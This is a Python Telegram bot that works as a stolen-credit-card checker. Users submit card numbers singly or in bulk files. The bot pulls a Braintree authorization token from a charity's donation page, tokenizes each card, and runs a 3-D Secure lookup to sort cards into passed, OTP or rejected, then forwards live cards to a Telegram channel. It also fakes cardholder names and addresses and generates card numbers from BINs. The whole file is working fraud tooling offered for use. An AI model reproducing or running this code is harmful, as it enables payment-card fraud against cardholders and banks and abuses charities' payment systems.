import telebot
import requests, re, base64, random, string, user_agent, time, uuid, jwt
from telebot import types

# Initialize bot
bot = telebot.TeleBot("5086583271:AAHmVIFyEk2x99bATJ6Swwk4HE6k2AU0ZOQ")

# Add counter variables at global scope
otp_count = 0
rejected_count = 0
passed_count = 0
total_count = 0

# Create a channel ID where to send successful cards
CHANNEL_ID = "-1001234567890"  # Replace with your channel ID

# Add format patterns
CARD_PATTERNS = [
    r'(\d{16})\|(\d{2})\|(\d{2})\|(\d{3,4})',      # number|mm|yy|cvv
    r'(\d{16})\|(\d{2})\|(\d{4})\|(\d{3,4})',      # number|mm|yyyy|cvv
    r'(\d{16}):(\d{2}):(\d{2}):(\d{3,4})',         # number:mm:yy:cvv
    r'(\d{16})\s+(\d{2})\s+(\d{2})\s+(\d{3,4})',   # number mm yy cvv
    r'(\d{16})\s+(\d{2})\/(\d{2})\s+(\d{3,4})',    # number mm/yy cvv
    r'(\d{16})\s+(\d{2})\/(\d{4})\s+(\d{3,4})'     # number mm/yyyy cvv
]

# Update format patterns
CARD_PATTERNS = [
    # Basic formats
    r'(\d{15,16})\|(\d{2})\|(\d{2})\|(\d{3,4})',      # cc|mm|yy|cvv
    r'(\d{15,16})\|(\d{2})\|(\d{4})\|(\d{3,4})',      # cc|mm|yyyy|cvv
    r'(\d{15,16})\|(\d{2})\/(\d{2})\|(\d{3,4})',      # cc|mm/yy|cvv
    r'(\d{15,16})\|(\d{2})\/(\d{4})\|(\d{3,4})',      # cc|mm/yyyy|cvv
]

# Add global variable to track checking status
is_checking = {}  # Dict to track checking status per user

def parse_card_line(line):
    line = line.strip()
    for pattern in CARD_PATTERNS:
        match = re.match(pattern, line)
        if match:
            cc, mm, yy, cvv = match.groups()
            # Convert 4-digit year to 2-digit if needed
            if len(yy) == 4:
                yy = yy[2:]
            # Remove any forward slashes from month
            mm = mm.replace('/', '')
            return f"{cc}|{mm}|{yy}|{cvv}"
    return None

# Keep existing helper functions
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] 
    
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] 
    
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
    states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]

    return city, state, street_address, zip_code

def vbv(card):
    card = card.strip()
    parts = re.split('[|]', card)
    n = parts[0]
    mm = parts[1]
    yy = parts[2]
    cvc = parts[3]
    
    url = 'www.donate.stroke.org.uk'
    price = '10000'
    r = requests.session()
    characters = string.ascii_letters + string.digits

    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    
    def num():
        number = ''.join(random.choices(string.digits, k=7))
        return f"303{number}"
    num = num()

    def generate_random_account():
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@gmail.com"
    acc = generate_random_account()
    
    def generar_uuid():
        return str(uuid.uuid4())

    def plug_rnd():
        random_chars = "".join(random.choices(string.ascii_letters + string.digits, k=10))
        random_suffix = "".join(random.choices(string.ascii_letters + string.digits, k=28))
        random_yux = "".join(random.choices(string.ascii_letters + string.digits, k=3))
        return f"{random_chars}::{random_suffix}::{random_yux}"
    
    def capture(string, start, end):
        start_pos, end_pos = string.find(start), string.find(end, string.find(start) + len(start))
        return string[start_pos + len(start) : end_pos] if start_pos != -1 and end_pos != -1 else None
    
    random_uuid = uuid.uuid4()
    ssid = (str(random_uuid))
    user = user_agent.generate_user_agent()
    r = requests.session()
    r.verify = False
    
    headers = {
        'accept': '*/*',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'user-agent': user,
    }

    res = r.get(
        'https://touch.org.sg/content/touchprogram/get-involved/donation/jcr:content/root/container/container/donationforms.token.json',
        headers=headers,
    )
    
    enc = res.text
    dec = base64.b64decode(enc).decode('utf-8')
    be = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
    
    sessionId = generar_uuid()
    sessionId2 = generar_uuid()
    Fingerprint = "".join(random.choice("0123456789abcdef") for _ in range(32))
    plug = plug_rnd()
    plug2 = plug_rnd()

    me = capture(
        dec,
        "https://api.braintreegateway.com:443/merchants/",
        "/client_api/v1/configuration",
    )

    h2 = {
        "Host": "payments.braintree-api.com",
        "content-type": "application/json",
        "authorization": f"Bearer {be}",
        "user-agent": user,
        "braintree-version": "2018-05-10",
        "accept": "*/*",
        "origin": "https://assets.braintreegateway.com",
        "referer": "https://assets.braintreegateway.com/",
    }

    p2 = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "dropin2",
            "sessionId": f"{sessionId}",
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": f"{n}",
                    "expirationMonth": f"{mm}",
                    "expirationYear": f"{yy}",
                    "cvv": f"{cvc}",
                    "cardholderName": f"{first_name} {last_name}",
                    "billingAddress": {"postalCode": f"{zip_code}"},
                },
                "options": {"validate": False},
            }
        },
        "operationName": "TokenizeCreditCard",
    }

    r2 = r.post(
        "https://payments.braintree-api.com/graphql",
        headers=h2,
        json=p2,
    )
    t2 = r2.text
    tok = capture(t2, '"token":"', '"')
    bin_ = capture(t2, '"bin":"', '"')

    h6 = {
        "Host": "api.braintreegateway.com",
        "user-agent": user,
        "content-type": "application/json",
        "accept": "*/*",
        "origin": f"https://{url}",
    }

    p6 = {
        'amount': '10000',
        'browserColorDepth': 24,
        'browserJavaEnabled': False,
        'browserJavascriptEnabled': True,
        'browserLanguage': 'en-US',
        'browserScreenHeight': 800,
        'browserScreenWidth': 360,
        'browserTimeZone': -180,
        'deviceChannel': 'Browser',
        'bin': '408832',
        'clientMetadata': {
            'requestedThreeDSecureVersion': '2',
            'sdkVersion': 'web/3.94.0',
            'cardinalDeviceDataCollectionTimeElapsed': 245,
            'issuerDeviceDataCollectionTimeElapsed': 592,
            'issuerDeviceDataCollectionResult': True,
        },
        'authorizationFingerprint': be,
        'braintreeLibraryVersion': 'braintree/web/3.94.0',
        '_meta': {
            'merchantAppId': 'mozartists.com',
            'platform': 'web',
            'sdkVersion': '3.94.0',
            'source': 'client',
            'integration': 'custom',
            'integrationType': 'custom',
        },
    }

    r6 = r.post(
        f"https://api.braintreegateway.com/merchants/{me}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
        headers=h6,
        json=p6,
    )
    t6 = r6.text
    status = capture(t6, '"status":"', '"')
    result = status.replace("_", " ").title()
    return result

def update_status(message, card, current_counts=None, is_file=False):
    if is_file:
        # Keep existing file format
        status_text = (
            "⌛️ Processing cards...\n"
            f"OTP ✅ : {current_counts['otp']}\n"
            f"REJECTED ❌ : {current_counts['rejected']}\n" 
            f"PASSED ✅ : {current_counts['passed']}\n"
            f"Total 🔵: {current_counts['total']}\n"
            f"Current Card 💳 : {card}"
        )
    else:
        # Simplified format for single card
        status_text = (
            f"𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗖𝗮𝗿𝗱 ⌛️\n\n"
            f"[↯] 𝗖𝗮𝗿𝗱 ➜ {card}"
        )
    return status_text

def check_card_format(card):
    parts = card.strip().split('|')
    if len(parts) != 4:
        return False
    
    cc, mm, yy, cvv = parts
    
    # Basic format checks
    if not (cc.isdigit() and len(cc) >= 15 and len(cc) <= 16):
        return False
    if not (mm.isdigit() and 1 <= int(mm) <= 12):
        return False
    # Allow both 2-digit and 4-digit years
    if not (yy.isdigit() and (len(yy) == 2 or len(yy) == 4)):
        return False
    if not (cvv.isdigit() and len(cvv) >= 3 and len(cvv) <= 4):
        return False
    
    # Convert 4-digit year to 2-digit if needed
    if len(yy) == 4:
        parts[2] = yy[2:]
        
    return True

# Handle /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Send me a card in format: number|mm|yy|cvv")

# Modify the channel message sending function
def send_to_channel(message, card, card_type):
    if CHANNEL_ID:
        try:
            if card_type == "PASSED":
                bot.send_message(CHANNEL_ID, f"💳 PASSED CARD:\n{card}")
            elif card_type == "OTP":
                bot.send_message(CHANNEL_ID, f"🔒 OTP CARD:\n{card}")
        except Exception as e:
            print(f"Failed to send to channel: {e}")

# Update keyboard creator function
def get_cancel_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    cancel_button = types.InlineKeyboardButton(text="❌ Stop Checking", callback_data="cancel_check")
    keyboard.add(cancel_button)
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data == "cancel_check")
def cancel_check(call):
    user_id = call.from_user.id
    is_checking[user_id] = False
    try:
        # Update message text but keep the keyboard visible
        bot.edit_message_text(
            "❌ Checking stopped!\n⚠️ Click stop again to close keyboard",
            call.message.chat.id,
            call.message.message_id,
            reply_markup=get_cancel_keyboard()  # Keep keyboard by passing it again
        )
    except Exception as e:
        print(f"Error updating message: {e}")
        
# When updating any message text, always include the keyboard:
def update_message_with_keyboard(chat_id, message_id, text):
    try:
        bot.edit_message_text(
            text,
            chat_id,
            message_id,
            reply_markup=get_cancel_keyboard()  # Always include keyboard
        )
    except Exception as e:
        print(f"Error updating message: {e}")

# Update the message handlers order and conditions
@bot.message_handler(commands=['gen'])
def handle_gen_command(message):
    try:
        text = message.text.strip()
        if ' ' not in text:
            bot.reply_to(message, "❌ Format: /gen BIN|MM|YY")
            return
            
        bin_pattern = text.split(' ', 1)[1]
        response = generate_cards(bin_pattern)
        bot.reply_to(message, response)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text.lower().startswith('.gen '))
def handle_gen_dot(message):
    try:
        bin_pattern = message.text[5:].strip()
        response = generate_cards(bin_pattern)
        bot.reply_to(message, response)
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Update the check_card handler to ignore gen commands
@bot.message_handler(func=lambda message: '|' in message.text and not message.text.lower().startswith(('.gen', '/gen')))
def check_card(message):
    global otp_count, rejected_count, passed_count, total_count
    user_id = message.from_user.id
    is_checking[user_id] = True
    
    try:
        card = message.text.strip()
        
        if not check_card_format(card):
            bot.reply_to(message, "Invalid card format. Use: number|mm|yy|cvv")
            return
            
        # Send initial status with persistent cancel button
        status_msg = bot.reply_to(
            message, 
            update_status(message, card, is_file=False),
            reply_markup=get_cancel_keyboard()
        )
        
        if not is_checking.get(user_id, True):
            return
            
        result = vbv(card)
        total_count += 1
        
        # Remove the status message update since we want to keep it minimal
        # The result will be shown in a separate message
        
        if result in ["Authenticate Successful", "Authenticate Attempt Successful"]:
            passed_count += 1
            response = (
                "𝗣𝗮𝘀𝘀𝗲𝗱 ✅\n\n"
                f"𝗖𝗮𝗿𝗱: {card}\n"
                "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n"
                "𝐑𝐞𝐬𝗽𝗼𝗻𝐬𝗲: Authenticate Attempt Successful"
            )
            send_to_channel(message, card, "PASSED")
            
        elif result == "Challenge Required":
            otp_count += 1
            response = (
                "𝗢𝗧𝗣 ✅\n\n"
                f"𝗖𝗮𝗿𝗱: {card}\n"
                "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n"
                f"𝐑𝐞𝗽𝗼𝗻𝐬𝗲: {result}"
            )
            send_to_channel(message, card, "OTP")
            
        elif "OTP" in result.upper():
            otp_count += 1
            response = (
                "𝗢𝗧𝗣 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 🔒\n\n"
                f"𝗖𝗮𝗿𝗱: {card}\n"
                "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n"
                f"𝐑𝐞𝗽𝗼𝗻𝐬𝗲: {result}"
            )
            # Send OTP card to channel
            send_to_channel(message, card, "OTP")
            
        else:
            rejected_count += 1
            response = (
                "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌\n\n"
                f"𝗖𝗮𝗿𝗱: {card}\n"
                "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n"
                f"𝐑𝐞𝗽𝗼𝗻𝐬𝗲: {result}"
            )
        
        bot.reply_to(message, response)
        
    except Exception as e:
        bot.reply_to(message, f"Error processing card: {str(e)}")

# Add file handler
@bot.message_handler(content_types=['document'])
def handle_docs(message):
    global otp_count, rejected_count, passed_count, total_count
    user_id = message.from_user.id
    is_checking[user_id] = True
    
    try:
        if not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "Please send a .txt file only")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cards = downloaded_file.decode('utf-8').splitlines()

        valid_cards = []
        for line in cards:
            card = parse_card_line(line)
            if card:
                valid_cards.append(card)

        if not valid_cards:
            bot.reply_to(message, "No valid cards found in file")
            return

        # Initial progress message
        progress_msg = bot.reply_to(message, 
            f"🔄 Starting check...\n"
            f"Total Cards: {len(valid_cards)}\n"
            f"Progress: [0/{len(valid_cards)}] 0%\n"
            f"━━━━━━━━━━━━━\n"
            f"OTP: 0\n"
            f"PASSED: 0\n"
            f"REJECTED: 0\n"
            f"Current: Waiting...",
            reply_markup=get_cancel_keyboard()
        )

        # Keep track of found cards
        found_cards = {
            'otp': [],
            'passed': []
        }

        for index, card in enumerate(valid_cards, 1):
            if not is_checking.get(user_id, True):
                bot.edit_message_text(
                    "✋ Checking process stopped by user\n\n"
                    f"Checked: {index-1}/{len(valid_cards)} cards",
                    message.chat.id,
                    progress_msg.message_id
                )
                return

            try:
                result = vbv(card)
                total_count += 1

                if result in ["Authenticate Successful", "Authenticate Attempt Successful"]:
                    passed_count += 1
                    found_cards['passed'].append(card)
                    send_to_channel(message, card, "PASSED")
                    bot.reply_to(message, 
                        "𝗣𝗮𝘀𝘀𝗲𝗱 ✅\n\n"
                        f"𝗖𝗮𝗿𝗱: {card}\n"
                        "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n"
                        f"𝐑𝐞𝗽𝗼𝗻𝐬𝗲: {result}"
                    )
                    status = "PASSED ✅"
                elif "OTP" in result.upper() or result == "Challenge Required":
                    otp_count += 1
                    found_cards['otp'].append(card)
                    send_to_channel(message, card, "OTP")
                    bot.reply_to(message, 
                        "𝗢𝗧𝗣 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 🔒\n\n"
                        f"𝗖𝗮𝗿𝗱: {card}\n"
                        "𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 3DS Lookup\n"
                        f"𝐑𝐞𝗽𝗼𝗻𝐬𝗲: {result}"
                    )
                    status = "OTP 🔒"
                else:
                    rejected_count += 1
                    status = "REJECTED ❌"

                # Calculate progress percentage
                progress = (index / len(valid_cards)) * 100
                progress_bar = "█" * int(progress/10) + "▒" * (10 - int(progress/10))

                # Update progress message
                update_message_with_keyboard(
                    message.chat.id,
                    progress_msg.message_id,
                    f"🔄 Checking in progress...\n"
                    f"Total Cards: {len(valid_cards)}\n"
                    f"Progress: [{index}/{len(valid_cards)}] {progress:.1f}%\n"
                    f"{progress_bar}\n"
                    f"OTP: {otp_count}\n"
                    f"PASSED: {passed_count}\n"
                    f"REJECTED: {rejected_count}\n"
                    f"Current: {card}\n"
                    f"Status: {status}\n"
                    f"Response: {result}"
                )

                # Update sleep delay for file checking
                time.sleep(10)  # Changed delay from 3 to 10 seconds

            except Exception as e:
                continue

        # Final summary with found cards
        summary = (
            f"✅ Check Completed!\n"
            f"Total Cards: {len(valid_cards)}\n"
            f"Progress: [{len(valid_cards)}/{len(valid_cards)}] 100%\n"
            f"████████████\n"
            f"OTP: {otp_count}\n"
            f"PASSED: {passed_count}\n"
            f"REJECTED: {rejected_count}\n\n"
        )

        if found_cards['passed'] or found_cards['otp']:
            summary += "🎯 Found Cards:\n\n"
            if found_cards['passed']:
                summary += "PASSED CARDS:\n" + "\n".join(found_cards['passed']) + "\n\n"
            if found_cards['otp']:
                summary += "OTP CARDS:\n" + "\n".join(found_cards['otp'])

        bot.edit_message_text(summary, message.chat.id, progress_msg.message_id)

    except Exception as e:
        bot.reply_to(message, f"Error processing file: {str(e)}")

import random
import re

def get_bin_info(bin_number):
    """Get BIN information from the lookup service"""
    try:
        url = f"https://lookup.binlist.net/{bin_number[:6]}"
        headers = {"Accept-Version": "3"}
        response = requests.get(url, headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            return {
                'scheme': data.get('scheme', 'N/A').upper(),
                'type': data.get('type', 'N/A').upper(),
                'bank': data.get('bank', {}).get('name', 'N/A'),
                'country': data.get('country', {}).get('name', 'N/A')
            }
    except:
        pass
    
    return {
        'scheme': 'N/A',
        'type': 'N/A',
        'bank': 'N/A',
        'country': 'N/A'
    }

def generate_cards(bin_pattern):
    """Generate 10 cards with support for multiple formats"""
    try:
        from datetime import datetime
        current = datetime.now()
        default_mm = str(current.month).zfill(2)
        default_yy = str((current.year + 5) % 100).zfill(2)

        pattern = bin_pattern.strip()

        # Handle format with x's (519535861xxxxxxx|11|2026)
        if 'x' in pattern.lower():
            parts = pattern.split('|')
            if len(parts) < 2:
                return "❌ Invalid format. Use: BINxxxxxx|MM|YY"
                
            bin_base = parts[0].lower()
            # Count required x's
            x_count = bin_base.count('x')
            # Remove x's and get the base numbers
            bin_base = bin_base.replace('x', '')
            
            if len(parts) == 3:
                mm, yy = parts[1], parts[2]
            elif len(parts) == 4:  # Handle format like 529021232832xxxx|25|11|xxx
                mm, yy = parts[1], parts[2]
                # Ignore the CVV part (parts[3])
            else:
                mm, yy = default_mm, default_yy

            # Generate cards with x replacements
            cards = []
            for _ in range(10):
                # Generate random digits for x positions
                random_digits = ''.join([str(random.randint(0, 9)) for _ in range(x_count)])
                card_number = bin_base + random_digits
                cvv = str(random.randint(100, 999))
                
                # Format the card
                if len(yy) == 4:
                    yy = yy[2:]
                card = f"{card_number}|{mm.zfill(2)}|{yy}|{cvv}"
                cards.append(card)

        else:
            # Original format handling
            # ...existing format handling code...
            if pattern.isdigit():
                bin_base = pattern
                mm, yy = default_mm, default_yy
            elif any(sep in pattern for sep in ['/', '|', '-']):
                sep = '|' if '|' in pattern else ('/' if '/' in pattern else '-')
                parts = pattern.split(sep)
                if len(parts) == 3:
                    bin_base, mm, yy = parts
                elif len(parts) == 2:
                    bin_base, mm = parts
                    yy = default_yy
                else:
                    return "❌ Invalid format. Use: BIN|MM|YY or BINxxxxxx|MM|YY"
            else:
                bin_base = pattern
                mm, yy = default_mm, default_yy

            # Validate inputs
            if not bin_base.isdigit():
                return "❌ BIN must contain only numbers"
                
            if not mm.isdigit() or len(mm) > 2 or not (1 <= int(mm) <= 12):
                return "❌ Invalid month (MM). Use 01-12"
                
            # Handle 4-digit years
            if len(yy) == 4:
                yy = yy[2:]
            elif not yy.isdigit() or len(yy) != 2:
                return "❌ Invalid year (YY). Use 2 digits"

            # Generate standard format cards
            remaining_length = 16 - len(bin_base)
            cards = []
            for _ in range(10):
                remaining = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
                card_number = bin_base + remaining
                cvv = str(random.randint(100, 999))
                card = f"{card_number}|{mm.zfill(2)}|{yy}|{cvv}"
                cards.append(card)

        # Get BIN info before formatting response
        bin_info = get_bin_info(bin_base)
        
        # Format response with BIN info
        response = (
            f"𝗕𝗜𝗡 ⇾ {bin_base[:6]}\n"
            f"𝗠𝗢𝗡𝗧𝗛 ⇾ {mm}\n"
            f"𝗬𝗘𝗔𝗥 ⇾ 20{yy}\n"
            f"𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ 10\n\n"
        )
        
        response += "\n".join(cards) + "\n\n"
        
        response += (
            f"𝗦𝗰𝗵𝗲𝗺𝗲 ⇾ {bin_info['scheme']}\n"
            f"𝗖𝗮𝘁𝗲𝗴𝗼𝗿𝘆 ⇾ {bin_info['type']}\n"
            f"𝗕𝗮𝗻𝗸 ⇾ {bin_info['bank']}\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {bin_info['country']}"
        )
        
        return response
        
    except Exception as e:
        return f"❌ Error: {str(e)}"

def generate_multiple_bins(text):
    """Handle multiple BIN requests from different formats"""
    try:
        # Split text into lines and filter empty lines
        lines = [line.strip() for line in text.split('\n') if line.strip()]
        
        if not lines:
            return "❌ No valid BINs found"
            
        # Get first line format (.gen or /gen)
        first_line = lines[0]
        command = None
        if first_line.lower().startswith('.gen '):
            command = '.gen '
        elif first_line.lower().startswith('/gen '):
            command = '/gen '
            
        if not command:
            return "❌ First line must start with .gen or /gen"

        # Process all lines
        bins_to_process = []
        
        # Get default date
        from datetime import datetime
        current = datetime.now()
        default_mm = str(current.month).zfill(2)
        default_yy = str((current.year + 5) % 100).zfill(2)
        
        # Process first line
        first_bin = first_line[len(command):].strip()
        bins_to_process.append(f"{first_bin}|{default_mm}|{default_yy}")
        
        # Process remaining lines
        for line in lines[1:]:
            if line:  # Skip empty lines
                # Remove .gen or /gen if present
                if line.lower().startswith(('.gen ', '/gen ')):
                    bin_value = line.split(' ', 1)[1].strip()
                else:
                    bin_value = line.strip()
                    
                # Add to processing list with default date
                if bin_value:
                    bins_to_process.append(f"{bin_value}|{default_mm}|{default_yy}")

        # Generate cards for each BIN
        results = []
        for i, bin_pattern in enumerate(bins_to_process, 1):
            try:
                cards_response = generate_cards(bin_pattern)
                if cards_response and "❌" not in cards_response:
                    header = f"𝗕𝗜𝗡 #{i} ➜ {bin_pattern.split('|')[0]}\n"
                    results.append(header + cards_response)
            except Exception as e:
                continue

        # Combine results
        if results:
            return "\n\n➖➖➖➖➖➖➖➖➖➖➖➖\n\n".join(results)
            
        return "❌ No valid BINs found to process"
        
    except Exception as e:
        return f"❌ Error: {str(e)}"

@bot.message_handler(func=lambda message: '\n' in message.text and message.text.lower().strip().startswith(('.gen ', '/gen ')))
def handle_multi_line_gen(message):
    try:
        response = generate_multiple_bins(message.text)
        # Split response into chunks if too long
        if len(response) > 4000:
            chunks = [response[i:i+4000] for i in range(0, len(response), 4000)]
            for chunk in chunks:
                bot.reply_to(message, chunk)
        else:
            bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(func=lambda message: message.text.lower().startswith(('.gen ', '/gen ')))
def handle_single_gen(message):
    try:
        # Handle single BIN request
        if message.text.lower().startswith('.gen '):
            bin_pattern = message.text[5:].strip()
        else:  # /gen
            bin_pattern = message.text.split(' ', 1)[1]
        response = generate_cards(bin_pattern)
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Remove the old handlers since we combined them
# Delete or comment out these handlers:
# @bot.message_handler(commands=['gen'])
# @bot.message_handler(func=lambda message: message.text.lower().startswith('.gen '))

# Start the bot
if __name__ == "__main__":
    print("Bot is running...")
    bot.polling()